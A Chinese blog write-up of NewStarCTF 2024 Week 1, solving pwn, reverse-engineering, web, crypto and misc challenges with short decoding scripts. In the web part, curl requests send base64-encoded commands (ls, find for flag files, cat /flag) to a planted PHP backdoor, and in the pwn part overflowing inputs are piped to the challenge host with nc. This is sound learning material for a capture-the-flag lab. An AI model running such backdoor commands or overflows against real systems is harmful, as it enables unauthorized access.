<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>NewStarCTF 2024 WriteUp | 棱晶の小窝</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="注：这是我第一次参加CTF，初来乍到，当时的许多表达、做法放在现在看都是不专业甚至可笑的，就当做黑历史吧… 赛题轮次：Week1已解出的题目：   题目类型 题目名称    Pwn Real Login、Game、overwrite、gdb   Reverse base64、ezAndroidStudy、Simple_encryption、ez_debug、begin   Web headach3">
<meta property="og:type" content="article">
<meta property="og:title" content="NewStarCTF 2024 WriteUp">
<meta property="og:url" content="https://astralprisma.github.io/2024/11/04/newstar_24_wp/index.html">
<meta property="og:site_name" content="棱晶の小窝">
<meta property="og:description" content="注：这是我第一次参加CTF，初来乍到，当时的许多表达、做法放在现在看都是不专业甚至可笑的，就当做黑历史吧… 赛题轮次：Week1已解出的题目：   题目类型 题目名称    Pwn Real Login、Game、overwrite、gdb   Reverse base64、ezAndroidStudy、Simple_encryption、ez_debug、begin   Web headach3">
<meta property="og:locale">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/ns24_ys.png">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/ns24_smc.png">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/ns24_011vm.png">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/ns24_noe.png">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/ns24_DTMF.png">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/ns24_maze.png">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/ns24_ovo.png">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/ns24_scancode.png">
<meta property="og:image" content="https://astralprisma.github.io/source/pictures/ns24_myarm.png">
<meta property="article:published_time" content="2024-11-03T16:00:00.000Z">
<meta property="article:modified_time" content="2025-03-15T13:44:48.940Z">
<meta property="article:author" content="Astral Prisma">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://astralprisma.github.io/source/pictures/ns24_ys.png">
  
  
    <link rel="shortcut icon" href="/XH.png">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/OTSA.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>棱晶の小窝 </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/AP.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Astral Prisma </div>
      <div class="dot"></div>
      <div class="subtitle">星界棱晶 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/454936579" title="Bilibili"><image src=https://www.bilibili.com/favicon.ico></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://www.primegrid.com/show_user.php?userid=1243718" title="PrimeGrid"><image src=https://www.primegrid.com/images/favicon_32.png></image></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/AstralPrisma" title="GitHub"><image src=https://github.githubassets.com/favicons/favicon.png></image></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/WriteUp/">
                WriteUp
                <div class="category-count">9</div>
            </a>
        </div>
    </div>
  </div>


    
      

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-newstar_24_wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        NewStarCTF 2024 WriteUp
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-11-03T16:00:00.000Z" itemprop="datePublished">2024-11-04</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/WriteUp/">WriteUp</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            28k words 
          </div>
        </div>
        
      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p><em>注：这是我第一次参加CTF，初来乍到，当时的许多表达、做法放在现在看都是不专业甚至可笑的，就当做黑历史吧…</em></p>
<h1 id="赛题轮次：Week1"><a href="#赛题轮次：Week1" class="headerlink" title="赛题轮次：Week1"></a>赛题轮次：Week1</h1><h2 id="已解出的题目："><a href="#已解出的题目：" class="headerlink" title="已解出的题目："></a>已解出的题目：</h2><table>
<thead>
<tr>
<th align="center">题目类型</th>
<th align="center">题目名称</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Pwn</td>
<td align="center">Real Login、Game、overwrite、gdb</td>
</tr>
<tr>
<td align="center">Reverse</td>
<td align="center">base64、ezAndroidStudy、Simple_encryption、ez_debug、begin</td>
</tr>
<tr>
<td align="center">Web</td>
<td align="center">headach3、会赢吗、智械危机</td>
</tr>
<tr>
<td align="center">Crypto</td>
<td align="center">xor、Base、一眼秒了、Strange King</td>
</tr>
<tr>
<td align="center">Misc</td>
<td align="center">WhereIsFlag、Labyrinth、decompress、pleasingMusic、兑换码</td>
</tr>
</tbody></table>
<h2 id="Pwn方向："><a href="#Pwn方向：" class="headerlink" title="Pwn方向："></a>Pwn方向：</h2><h3 id="Real-Login："><a href="#Real-Login：" class="headerlink" title="Real Login："></a>Real Login：</h3><p>反编译观察函数，发现要输入密码，找到密码是<font color=red><strong>NewStar!!!</strong></font>，观察发现没有位数溢出保护机制，在虚拟机中nc地址后输入NewStar!!!+大量额外字符弹出祝贺，此时已经成功，用ls指令查看文件发现有一个flag，再用cat查看得到<font color=deepskyblue><strong>flag{6a532e27-a281-4c15-b965-c030de9c47df}</strong></font>.</p>
<h3 id="Game："><a href="#Game：" class="headerlink" title="Game："></a>Game：</h3><p>反编译观察函数，发现是要求在5s内输入0-9之间的数，总和超出999之后可以获得控制权限，于是在nc地址之后以形如“9 换行 9 换行 9…”的形式同时输入一百余次复制粘贴执行，获得控制权，用ls查看发现有flag，再查看发现<font color=deepskyblue><strong>flag{4a045fea-9b70-4637-8561-cf5bece7e814}</strong></font>.</p>
<h3 id="Overwrite："><a href="#Overwrite：" class="headerlink" title="Overwrite："></a>Overwrite：</h3><p>反编译观察函数，第一个要求填入读取的字节数，不能超过48字节（但为什么容器里超过40就不行了？），第二个要求填数，填入的数被存在nbytes里，但接下来程序却会用nptr和114514进行比较，结合题目名称猜测应该是要输入超长的字节来覆盖同栈上的nptr，于是将第一个空填入超大的数，发现第二空能正常填入，经过动态调试发现输入54个9时nptr会被覆盖为999999\n，大于等于114514，所以在第一空输入一大堆9，第二空输入54个9，返回<font color=deepskyblue><strong>flag{48d03781-f157-4869-8041-5ba44bef070a}</strong></font>.</p>
<h3 id="gdb："><a href="#gdb：" class="headerlink" title="gdb："></a>gdb：</h3><p>反编译观察函数，注意到是把字符串<font color=red><strong>0d000721</strong></font>以key &#x3D; <font color=red><strong>mysecretkey1234567890abcdefghijk</strong></font>用AVX指令集进行了复杂的加密，再与输入的值进行比对，观察加密函数，经过IDA+linux远程动态调试和把原函数丢给AI验证出需要输入的字符对应的十六进制是<font color=aqua><strong>5D 1D 43 55 53 45 57 45</strong></font>，对应的字符是]_x001D_CUSEWE（第二个字符是不可打印字符），尝试把不可打印字符输入进命令行中，发现进入程序并不能正常转换，于是使用命令来代替输入：<font color=red><strong>printf ‘\x5D\x1D\x43\x55\x53\x45\x57\x45’ | nc 容器地址</strong></font>，返回祝贺和<font color=deepskyblue><strong>flag{205f9ae3-9d66-4523-b4b7-283cb5e1e381}</strong></font>.</p>
<h2 id="Reverse方向："><a href="#Reverse方向：" class="headerlink" title="Reverse方向："></a>Reverse方向：</h2><h3 id="Base64："><a href="#Base64：" class="headerlink" title="Base64："></a>Base64：</h3><p>用IDA打开base64.exe然后在string里面发现以下几行：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011003</span>	<span class="number">00000011</span>	C	<span class="keyword">Enter</span> the flag: </span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011014</span>	<span class="number">00000018</span>	C	Wrong flag, try again.\n</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011030</span>	<span class="number">00000025</span>	C	g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011055</span>	0000000F	C	Correct flag!\n</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011064</span>	<span class="number">00000014</span>	C	Welcome to NewStar!</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">0000000140011080</span>	<span class="number">00000041</span>	C	WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/</span><br></pre></td></tr></table></figure>
<p>由最后一行和题目名称猜测该行为换了表的base64加密，g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc&#x3D;应该是用换表base64加密的flag，由此构建Python代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=&quot;</span></span><br><span class="line">base64_1 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">base64_2 = <span class="string">&quot;WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/&quot;</span></span><br><span class="line">t = str1.translate(<span class="built_in">str</span>.maketrans(base64_2,base64_1))</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(t).decode())</span><br></pre></td></tr></table></figure>
<p>解得flag为<font color=deepskyblue><strong>flag{y0u_kn0w_base64_well}</strong></font>.</p>
<h3 id="ezAndroidStudy："><a href="#ezAndroidStudy：" class="headerlink" title="ezAndroidStudy："></a>ezAndroidStudy：</h3><p>在模拟器上安装并运行apk，进入后提示用jadx进行反编译，并提示第一段flag在Androidmanifest.xml的activity里，反编译后在资源文件里找到Androidmanifest.xml，发现有两个activity，其中一个<br><code>&lt;activity android:name=&quot;work.pangbai.ezandroidstudy.Homo&quot;/&gt;</code>点开后发现第一部分的flag：<font color=deepskyblue><strong>flag{Y0u</strong></font>，进入二部分，得知flag在<code>resources.arsc/res/value/string.xml</code>中，寻找得到第二部分的flag：<font color=deepskyblue><strong>_@r4</strong></font>，进入第三部分，根据提示在<code>/res/layout/activity\_main.xml</code>中找到第三部分的flag：<font color=deepskyblue><strong>_900d</strong></font>，进入第四部分，根据提示在<code>/res/raw/</code>找到<code>flag4.txt</code>，获得第四部分的flag：<font color=deepskyblue><strong>_andr01d</strong></font>，进入第五部分，根据其提示在<code>/lib/x86\_64/</code>中找到<code>libezandroidstudy.so</code>和<code>/libpl\_droidsonroids\_gif.so</code>，导出后在IDA查看<code>libezandroidstudy.so</code>，在函数中找到<code>Java\_work\_pangbai\_ezandroidstudy\_MainActivity\_getflag5</code>，反编译发现第五部分的flag：<font color=deepskyblue><strong>_r4V4rs4r}</strong></font>，拼合得到<font color=deepskyblue><strong>flag{Y0u_@r4_900d_andr01d_r4V4rs4r}</strong></font>.</p>
<h3 id="Simple-encryption："><a href="#Simple-encryption：" class="headerlink" title="Simple_encryption："></a>Simple_encryption：</h3><p>在IDA中反编译并观察代码，首先要求输入的flag会逐个字符填入input数组中，直到达到30个字符，之后对于其中每个字符，根据其在数组中的位置分别进行不同的转换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; len; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !(j % <span class="number">3</span>) )<span class="comment">//3的倍数</span></span><br><span class="line">    input[j] -= <span class="number">31</span>;<span class="comment">//让该字符的ASCII值减31</span></span><br><span class="line">  <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">1</span> )<span class="comment">//余1</span></span><br><span class="line">    input[j] += <span class="number">41</span>;<span class="comment">//让该字符的ASCII值加41</span></span><br><span class="line">  <span class="keyword">if</span> ( j % <span class="number">3</span> == <span class="number">2</span> )<span class="comment">//余2</span></span><br><span class="line">    input[j] ^= <span class="number">0x55u</span>;<span class="comment">//对该字符的ASCII值进行0x55的异或</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来是将字符ASCII转为十六进制并与buffer中的值进行比较：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; len; ++k )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x%02x &quot;</span>, input[k]);</span><br><span class="line">  <span class="keyword">if</span> ( input[k] != buffer[k] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中buffer为<font color=lime><strong>{0x47, 0x95, 0x34, 0x48, 0xA4, 0x1C, 0x35, 0x88, 0x64, 0x16, 0x88,0x07, 0x14, 0x6A, 0x39, 0x12, 0xA2, 0x0A, 0x37, 0x5C, 0x07, 0x5A,0x56, 0x60, 0x12, 0x76, 0x25, 0x12, 0x8E, 0x28, 0x00, 0x00}</strong></font>，倒推得到<font color=LimeGreen><strong>{102, 108, 97, 103, 123, 73, 84, 95, 49, 53, 95, 82, 51, 65, 108, 49, 121, 95, 86, 51, 82, 121, 45, 53, 49, 77, 112, 49, 101, 125, 31, -41}</strong></font>（末尾两个数据排除），结合ASCII得知flag为：<font color=deepskyblue><strong>flag{IT_15_R3Al1y_V3Ry-51Mp1e}</strong></font>，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x47</span>, <span class="number">0x95</span>, <span class="number">0x34</span>, <span class="number">0x48</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>, <span class="number">0x35</span>, <span class="number">0x88</span>, <span class="number">0x64</span>, <span class="number">0x16</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0x14</span>, <span class="number">0x6A</span>, <span class="number">0x39</span>, <span class="number">0x12</span>, <span class="number">0xA2</span>, <span class="number">0x0A</span>, <span class="number">0x37</span>, <span class="number">0x5C</span>, <span class="number">0x07</span>, <span class="number">0x5A</span>,<span class="number">0x56</span>, <span class="number">0x60</span>, <span class="number">0x12</span>, <span class="number">0x76</span>, <span class="number">0x25</span>, <span class="number">0x12</span>, <span class="number">0x8E</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span>(i % <span class="number">3</span> == <span class="number">0</span>):</span><br><span class="line">        a[i] += <span class="number">31</span></span><br><span class="line">    <span class="keyword">elif</span>(i % <span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">        a[i] -= <span class="number">41</span></span><br><span class="line">    <span class="keyword">elif</span>(i % <span class="number">3</span> == <span class="number">2</span>):</span><br><span class="line">        a[i] = a[i] ^ <span class="number">0x55</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]),end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="ez-debug："><a href="#ez-debug：" class="headerlink" title="ez_debug："></a>ez_debug：</h3><p>将程序用x64dbg打开，将断点打在输出Decrypted flag:所对应的行，进行动态调试，输入随便的字符，到断点位置时发现断点的周围变量中含有flag：<font color=deepskyblue><strong>flag{y0u_ar3_g0od_@_Debu9}</strong></font>.</p>
<h3 id="Begin："><a href="#Begin：" class="headerlink" title="Begin："></a>Begin：</h3><p>运行exe程序，发现需要用IDA进行反编译，打开IDA进行反编译，按<code>Fn+F5</code>反编译main函数得到第八行为：<br><code>strcpy((char *)&amp;flag_part1, &quot;OK,You can click on this variable to discover the first part\n&quot;);</code><br>点击其中的变量得到乱码：6B614D7B67616C66h，按a转化为字符串得到flag的第一部分：flag{Mak3_aN_（这里在看十六进制的时候也找到了对应行：<br><code>0000000000403010  66 6C 61 67 7B 4D 61 6B  33 5F 61 4E 5F 00 00 00</code><br><font color=deepskyblue><strong>flag{Mak3_aN_</strong></font>…），再按<code>Fn+Shift+F12</code>转到<br><code>.rdata:0000000000404000	00000086	C	this is flag part2: 3Ff0rt\_tO\_5eArcH\_  ,You can press&#39; x &#39;on the variable name of this string to view the function that references it</code>，得到第二部分的flag：<font color=deepskyblue><strong>3Ff0rt_tO_5eArcH_</strong></font>，注意到其下方两行还有提示：<br><code>.rdata:0000000000404088	0000007A	C	And you can press &#39;x&#39; key on the function name to see which function references this function,Flag Part 3 is right there.</code>和<br><code>.rdata:0000000000404108	00000045	C	the function name is flag part3,Don&#39;t forget to add a &#39;&#125;&#39; at the end</code>，按提示双击左侧<code>.rdata:0000000000404108</code>跳转到IDA_view，找到第三部分的flag函数为：<font color=deepskyblue><strong>F0r_th3_f14g_C0Rpse</strong></font>，组合得到<font color=deepskyblue><strong>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</strong></font>.</p>
<h2 id="Web方向："><a href="#Web方向：" class="headerlink" title="Web方向："></a>Web方向：</h2><h3 id="Headach3："><a href="#Headach3：" class="headerlink" title="Headach3："></a>Headach3：</h3><p>打开网页后发现是head(er) ache，header是标头，开启开发者模式，在网络页面刷新网页，得到一个文档，在响应标头里找到属性fl3g:<font color=deepskyblue><strong>flag{You_Ar3_R3Ally_A_9ooD_d0ctor}</strong></font>.</p>
<h3 id="会赢吗："><a href="#会赢吗：" class="headerlink" title="会赢吗："></a>会赢吗：</h3><p>第一个页面在源代码中发现flag第一部分<font color=deepskyblue><strong>ZmxhZ3tXQTB3</strong></font>以及第二个页面的后缀<font color=red><strong>&#x2F;4cqu1siti0n</strong></font>，第二个页面发现给出了一个getflag的方法，于是结合上面给出的课程名称，在控制台调用并输出第二部分的 flag: <font color=deepskyblue><strong>IV95NF9yM2Fs</strong></font>和第三个页面的后缀<font color=red><strong>&#x2F;s34l</strong></font>，第三个页面检查源代码后发现要把已封印的文本改成解封，发现flag的第三个部分<font color=deepskyblue><strong>MXlfR3I0c1B</strong></font>和第四个页面的后缀<font color=red><strong>&#x2F;Ap3x</strong></font>，进入第四个页面，发现有一个被禁用的noscript按钮无量空处，挪出来后发现不显示，于是在前面将class为s的改为显示，按下得到flag的第四部分<font color=deepskyblue><strong>fSkpKcyF9</strong></font>，合并起来之后得到<font color=deepskyblue><strong>ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9</strong></font>，进行base64后解密得到<font color=deepskyblue><strong>flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}</strong></font>.</p>
<h3 id="智械危机："><a href="#智械危机：" class="headerlink" title="智械危机："></a>智械危机：</h3><p>询问ai后在网页后加入后缀<font color=red><strong>&#x2F;robots.txt</strong></font>，访问得到两行数据：<code>User-agent: \*</code>和<code>Disallow: /backd0or.php</code>，查询百科得知<code>robots.txt</code>的作用，并访问后缀<code>/backd0or.php</code>，访问后查询得知这是一种后门示例，需要提供cmd和key，观察代码得知key会被base64解码为decoded_key，cmd会被先翻转字母再取MD5，然后判定两者是否相等，如果不等则以不合法的密钥来结束，否则将cmd也base64解码，执行被解码的cmd，若访问后门时候提供了cmd和key就会执行decrypt_request后再带进execute_cmd执行得到系统返回的cmd，否则就展示后门的源代码.<br>首先尝试列出所有文件（ls指令），尝试Linux输入命令：<br><code>curl -X POST -d &quot;cmd=bHM=&amp;key=N2FiZThiMjRiZDAxMzc0NDZmZDMzNmMyMjk4ZmNjYTA=&quot; http://eci-2zeimkpaddax8w71qsw9.cloudeci1.ichunqiu.com/backd0or.php </code>，只返回了backd0or.php、index.php、robots.txt，并没有所需的flag，于是进一步搜寻所有带flag的文件（<code>find / -name &quot;flag\*&quot; 2&gt;/dev/null</code>）：<code>curl -X POST -d &quot;cmd=ZmluZCAvIC1uYW1lICJmbGFnKiIgMj4vZGV2L251bGw=&amp;key=Y2ZlNDg1MjNjNTY4NmI5YzBjNmIwM2M3YmQyN2JiMjg=&quot; http://eci-2zeimkpaddax8w71qsw9.cloudeci1.ichunqiu.com/backd0or.php</code>，返回了如下文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/sys/devices/pnp0/00:04/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/pci0000:00/0000:00:03.0/virtio0/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/virtual/net/dummy0/flags</span><br><span class="line">/flag</span><br></pre></td></tr></table></figure>
<p>再查看flag：<code>curl -X POST -d &quot;cmd=Y2F0IC9mbGFn&amp;key=ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI=&quot; http://eci-2zeimkpaddax8w71qsw9.cloudeci1.ichunqiu.com/backd0or.php</code>，得到<font color=deepskyblue><strong>flag{03b6f3f8-8dfa-40e3-b077-59d9009d520e}</strong></font>.</p>
